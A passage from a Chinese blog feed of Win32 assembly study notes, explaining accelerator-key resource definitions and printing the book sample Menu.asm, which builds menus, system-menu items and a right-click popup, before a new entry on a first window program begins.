535之间的数字</li><li>整个定义内容也是用begin和end（或花括号）包含起来</li></ul><p>字段的含义如下所示</p><p>●键名——表示加速键对应的按键，可以有3种方式定义。</p><p>■”^字母”：表示Ctrl键加上字母键。</p><p>■”字母”：表示字母，这时类型必须指明是VIRTKEY。</p><p>■数值：表示ASCII码为该数值的字母，这时类型必须指明为ASCII。</p><p>●命令ID——按下加速键后，Windows向程序发送的命令ID。如果想把加速键和菜单项关联起来，这里就是要关联菜单项的命令ID。</p><p>●类型——用来指定键的定义方式，可以是VIRTKEY和ASCII，分别用来表示“键名”字段定义的是虚拟键还是ASCII码。</p><p>●选项——可以是Alt，Control或Shift中的单个或多个，如果指定多个，则中间用逗号隔开，表示加速键是按键加上这些控制键的组合键。</p><h3 id="3-）使用菜单和加速键"><a href="#3-）使用菜单和加速键" class="headerlink" title="3.）使用菜单和加速键"></a>3.）使用菜单和加速键</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; Sample code for &lt; Win32ASM Programming 3rd Edition&gt;</span><br><span class="line">; by 罗云彬, http://www.win32asm.com.cn</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; Menu.asm</span><br><span class="line">; 菜单资源的使用例子</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; 使用 nmake 或下列命令进行编译和链接:</span><br><span class="line">; ml /c /coff Menu.asm</span><br><span class="line">; rc Menu.rc</span><br><span class="line">; Link /subsystem:windows Menu.obj Menu.res</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap :none</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; Include 文件定义</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">includewindows.inc</span><br><span class="line">includeuser32.inc</span><br><span class="line">includelibuser32.lib</span><br><span class="line">includekernel32.inc</span><br><span class="line">includelibkernel32.lib</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; Equ 等值定义</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">ICO_MAINequ1000h;图标</span><br><span class="line">IDM_MAINequ2000h;菜单</span><br><span class="line">IDA_MAINequ2000h;加速键</span><br><span class="line">IDM_OPENequ4101h</span><br><span class="line">IDM_OPTIONequ4102h</span><br><span class="line">IDM_EXITequ4103h</span><br><span class="line">IDM_SETFONTequ4201h</span><br><span class="line">IDM_SETCOLORequ4202h</span><br><span class="line">IDM_INACTequ4203h</span><br><span class="line">IDM_GRAYequ4204h</span><br><span class="line">IDM_BIGequ4205h</span><br><span class="line">IDM_SMALLequ4206h</span><br><span class="line">IDM_LISTequ4207h</span><br><span class="line">IDM_DETAILequ4208h</span><br><span class="line">IDM_TOOLBARequ4209h</span><br><span class="line">IDM_TOOLBARTEXTequ4210h</span><br><span class="line">IDM_INPUTBARequ4211h</span><br><span class="line">IDM_STATUSBARequ4212h</span><br><span class="line">IDM_HELPequ4301h</span><br><span class="line">IDM_ABOUTequ4302h</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; 数据段</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">.data?</span><br><span class="line">hInstancedd?</span><br><span class="line">hWinMaindd?</span><br><span class="line">hMenudd?</span><br><span class="line">hSubMenudd?</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; 数据段</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">.const</span><br><span class="line">szClassNamedb&#x27;Menu Example&#x27;,0</span><br><span class="line">szCaptionMaindb&#x27;Menu&#x27;,0</span><br><span class="line">szMenuHelpdb&#x27;帮助主题(&amp;H)&#x27;,0</span><br><span class="line">szMenuAboutdb&#x27;关于本程序(&amp;A)...&#x27;,0</span><br><span class="line">szCaptiondb&#x27;菜单选择&#x27;,0</span><br><span class="line">szFormatdb&#x27;您选择了菜单命令：%08x&#x27;,0</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; 代码段</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">.code</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_DisplayMenuItemproc_dwCommandID</span><br><span class="line">local@szBuffer[256]:byte</span><br><span class="line"></span><br><span class="line">pushad</span><br><span class="line">invokewsprintf,addr @szBuffer,addr szFormat,_dwCommandID</span><br><span class="line">invokeMessageBox,hWinMain,addr @szBuffer,offset szCaption,MB_OK</span><br><span class="line">popad</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">_DisplayMenuItemendp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Quitproc</span><br><span class="line"></span><br><span class="line">invokeDestroyWindow,hWinMain</span><br><span class="line">invokePostQuitMessage,NULL</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">_Quitendp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_ProcWinMainprocuses ebx edi esi hWnd,uMsg,wParam,lParam</span><br><span class="line">local@stPos:POINT</span><br><span class="line">local@hSysMenu</span><br><span class="line"></span><br><span class="line">moveax,uMsg</span><br><span class="line">.ifeax ==WM_CREATE</span><br><span class="line">invokeGetSubMenu,hMenu,1</span><br><span class="line">movhSubMenu,eax</span><br><span class="line">;********************************************************************</span><br><span class="line">;在系统菜单中添加菜单项</span><br><span class="line">;********************************************************************</span><br><span class="line">invokeGetSystemMenu,hWnd,FALSE</span><br><span class="line">mov@hSysMenu,eax</span><br><span class="line">invokeAppendMenu,@hSysMenu,MF_SEPARATOR,0,NULL</span><br><span class="line">invokeAppendMenu,@hSysMenu,0,IDM_HELP,offset szMenuHelp</span><br><span class="line">invokeAppendMenu,@hSysMenu,0,IDM_ABOUT,offset szMenuAbout</span><br><span class="line">;********************************************************************</span><br><span class="line">; 处理菜单及加速键消息</span><br><span class="line">;********************************************************************</span><br><span class="line">.elseifeax ==WM_COMMAND</span><br><span class="line">invoke_DisplayMenuItem,wParam</span><br><span class="line">moveax,wParam</span><br><span class="line">movzxeax,ax</span><br><span class="line">.ifeax ==IDM_EXIT</span><br><span class="line">call_Quit</span><br><span class="line">.elseifeax &gt;=IDM_TOOLBAR &amp;&amp; eax &lt;= IDM_STATUSBAR</span><br><span class="line">movebx,eax</span><br><span class="line">invokeGetMenuState,hMenu,ebx,MF_BYCOMMAND</span><br><span class="line">.ifeax ==MF_CHECKED</span><br><span class="line">moveax,MF_UNCHECKED</span><br><span class="line">.else</span><br><span class="line">moveax,MF_CHECKED</span><br><span class="line">.endif</span><br><span class="line">invokeCheckMenuItem,hMenu,ebx,eax</span><br><span class="line">.elseifeax &gt;=IDM_BIG &amp;&amp; eax &lt;= IDM_DETAIL</span><br><span class="line">invokeCheckMenuRadioItem,hMenu,IDM_BIG,IDM_DETAIL,eax,MF_BYCOMMAND</span><br><span class="line">.endif</span><br><span class="line">;********************************************************************</span><br><span class="line">; 处理系统菜单消息</span><br><span class="line">;********************************************************************</span><br><span class="line">.elseifeax == WM_SYSCOMMAND</span><br><span class="line">moveax,wParam</span><br><span class="line">movzxeax,ax</span><br><span class="line">.ifeax == IDM_HELP || eax == IDM_ABOUT</span><br><span class="line">invoke_DisplayMenuItem,wParam</span><br><span class="line">.else</span><br><span class="line">invokeDefWindowProc,hWnd,uMsg,wParam,lParam</span><br><span class="line">ret</span><br><span class="line">.endif</span><br><span class="line">;********************************************************************</span><br><span class="line">; 按下右键时弹出一个POPUP菜单</span><br><span class="line">;********************************************************************</span><br><span class="line">.elseif eax == WM_RBUTTONDOWN</span><br><span class="line">invokeGetCursorPos,addr @stPos</span><br><span class="line">invokeTrackPopupMenu,hSubMenu,TPM_LEFTALIGN,@stPos.x,@stPos.y,NULL,hWnd,NULL</span><br><span class="line">;********************************************************************</span><br><span class="line">.elseifeax ==WM_CLOSE</span><br><span class="line">call_Quit</span><br><span class="line">;********************************************************************</span><br><span class="line">.else</span><br><span class="line">invokeDefWindowProc,hWnd,uMsg,wParam,lParam</span><br><span class="line">ret</span><br><span class="line">.endif</span><br><span class="line">;********************************************************************</span><br><span class="line">xoreax,eax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">_ProcWinMainendp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_WinMainproc</span><br><span class="line">local@stWndClass:WNDCLASSEX</span><br><span class="line">local@stMsg:MSG</span><br><span class="line">local@hAccelerator</span><br><span class="line"></span><br><span class="line">invokeGetModuleHandle,NULL</span><br><span class="line">movhInstance,eax</span><br><span class="line">invokeLoadMenu,hInstance,IDM_MAIN</span><br><span class="line">movhMenu,eax</span><br><span class="line">invokeLoadAccelerators,hInstance,IDA_MAIN</span><br><span class="line">mov@hAccelerator,eax</span><br><span class="line">;********************************************************************</span><br><span class="line">; 注册窗口类</span><br><span class="line">;********************************************************************</span><br><span class="line">invokeRtlZeroMemory,addr @stWndClass,sizeof @stWndClass</span><br><span class="line">invokeLoadIcon,hInstance,ICO_MAIN</span><br><span class="line">mov@stWndClass.hIcon,eax</span><br><span class="line">mov@stWndClass.hIconSm,eax</span><br><span class="line">invokeLoadCursor,0,IDC_ARROW</span><br><span class="line">mov@stWndClass.hCursor,eax</span><br><span class="line">pushhInstance</span><br><span class="line">pop@stWndClass.hInstance</span><br><span class="line">mov@stWndClass.cbSize,sizeof WNDCLASSEX</span><br><span class="line">mov@stWndClass.style,CS_HREDRAW or CS_VREDRAW</span><br><span class="line">mov@stWndClass.lpfnWndProc,offset _ProcWinMain</span><br><span class="line">mov@stWndClass.hbrBackground,COLOR_WINDOW + 1</span><br><span class="line">mov@stWndClass.lpszClassName,offset szClassName</span><br><span class="line">invokeRegisterClassEx,addr @stWndClass</span><br><span class="line">;********************************************************************</span><br><span class="line">; 建立并显示窗口</span><br><span class="line">;********************************************************************</span><br><span class="line">invokeCreateWindowEx,WS_EX_CLIENTEDGE,\</span><br><span class="line">offset szClassName,offset szCaptionMain,\</span><br><span class="line">WS_OVERLAPPEDWINDOW,\</span><br><span class="line">100,100,400,300,\</span><br><span class="line">NULL,hMenu,hInstance,NULL</span><br><span class="line">movhWinMain,eax</span><br><span class="line">invokeShowWindow,hWinMain,SW_SHOWNORMAL</span><br><span class="line">invokeUpdateWindow,hWinMain</span><br><span class="line">;********************************************************************</span><br><span class="line">; 消息循环</span><br><span class="line">;********************************************************************</span><br><span class="line">.whileTRUE</span><br><span class="line">invokeGetMessage,addr @stMsg,NULL,0,0</span><br><span class="line">.break.if eax== 0</span><br><span class="line">invokeTranslateAccelerator,hWinMain,@hAccelerator,addr @stMsg</span><br><span class="line">.ifeax == 0</span><br><span class="line">invokeTranslateMessage,addr @stMsg</span><br><span class="line">invokeDispatchMessage,addr @stMsg</span><br><span class="line">.endif</span><br><span class="line">.endw</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">_WinMainendp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">start:</span><br><span class="line">call_WinMain</span><br><span class="line">invokeExitProcess,NULL</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">endstart</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>emmm,我们不需要用这个东西来开发，所以我们看得懂就好啦</p><p>内容有点繁琐，看看书啦</p>]]></content>
      
      
      <categories>
          
          <category> WIN32程序设计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WIN32程序设计-第一个窗口程序（4）</title>
      <link href="/2023/05/04/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-4-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/05/04/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-4-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="开始了解窗口"><a href="#开始了解窗口" class="headerlink" title="开始了解窗口"></a>开始了解窗口</h1><h2 id="1-窗口是什么"><a href="#1-窗口是什么" class="headerlink" title="1.窗口是什么"></a>1.窗口是什么</h2><h3 id="1-）使用窗口的原因"><a href="#1-）使用窗口的原因" class="headerlink" title="1.）使用窗口的原因"></a>1.）使用窗口的原因</h3><ul><li>懒得说了，自行查阅</li></ul><h3 id="2-）窗口和程序的关系"><a href="#2-）窗口和程序的关系" class="headerlink" title="2.）窗口和程序的关系"></a>2.）窗口和程序的关系</h3><ul><li>一个窗口不一定是程序。可能是一个程序的一部分</li><li>一个程序也不能是一个窗口</li><li>窗口是人和计算机交互的界面</li><li>第一个标准的窗口为界面的程序的架构，而不是windows所有程序</li></ul><h2 id="2-窗口界面"><a href="#2-窗口界面" class="headerlink" title="2.窗口界面"></a>2.窗口界面</h2><ul><li>窗口大部分都长得差不多</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类的继承</span><br></pre></td></tr></table></figure><ul><li>窗口中有很多的部分，每一个部分都有自己的行为模式。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">类--&gt;对象</span><br><span class="line">就是使用api函数来写程序</span><br></pre></td></tr></table></figure><h2 id="3-窗口程序是如何工作的"><a href="#3-窗口程序是如何工作的" class="headerlink" title="3.窗口程序是如何工作的"></a>3.窗口程序是如何工作的</h2><h3 id="1-）窗口程序的运行模式"><a href="#1-）窗口程序的运行模式" class="headerlink" title="1.）窗口程序的运行模式"></a>1.）窗口程序的运行模式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">面向对象面向过程</span><br></pre></td></tr></table></figure><ul><li>窗口程序是事件驱动的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似：面向对象</span><br></pre></td></tr></table></figure><h3 id="2-）FirstWindow源代码"><a href="#2-）FirstWindow源代码" class="headerlink" title="2.）FirstWindow源代码"></a>2.）FirstWindow源代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 